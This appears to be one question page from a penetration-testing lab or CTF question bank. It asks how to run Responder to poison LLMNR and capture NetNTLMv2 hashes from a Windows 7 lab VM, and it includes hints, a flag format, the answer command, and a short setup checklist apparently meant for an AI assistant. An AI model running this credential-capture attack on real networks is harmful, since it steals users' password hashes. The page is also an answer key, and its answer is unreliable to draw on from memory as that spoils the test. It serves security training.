# Q104 — Responder LLMNR Poisoning (Concept)

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra`, `john`, `hashcat`, `crackmapexec`, `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Describe Responder usage on Parrot to capture NetNTLMv2 hashes from Win7 LLMNR queries. Provide invocation.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo responder -I eth0 -wrf`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-I <iface>`; `-w` WPAD; `-r` rogue services; `-f` fingerprint.
</details>

<details>
<summary>Hint 2</summary>

Hashes saved under /usr/share/responder/logs/.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo responder -I eth0 -wrf
```

Captures hashes when Win7 attempts LLMNR resolution.

**Answer:** `cmd=sudo responder -I eth0 -wrf`

📖 Ref: [playbooks/sniffing-playbook.md](../../playbooks/sniffing-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q104".
```
